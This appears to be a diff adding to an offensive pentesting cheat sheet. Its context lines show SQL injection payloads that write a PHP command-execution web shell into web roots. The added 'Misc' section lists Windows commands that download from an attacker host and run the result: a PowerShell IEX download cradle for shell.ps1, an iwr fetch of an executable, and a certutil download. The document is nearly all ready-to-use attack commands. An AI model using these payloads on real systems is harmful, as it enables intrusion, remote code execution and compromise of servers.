@@ -64,3 +64,14 @@ Shell From SQL Injection
 ?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
 # linux
 ?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
+
+---------------------------------------------------------
+
+Misc
+# Method of copying a file on windows mashine|
+                                   
+IEX(New-Object Net.WebClient).downloadstring(\"http://attacker_ip/shell.ps1\")
+iwr -UseBasicParsing -Uri http://attacker_ip/pr.exe OutFile 'the_path_where_you_want_to_store_your_pr.exe'
+certutil -urlcache -split -f http://attacker_ip
+
+--------------------------------------------------------
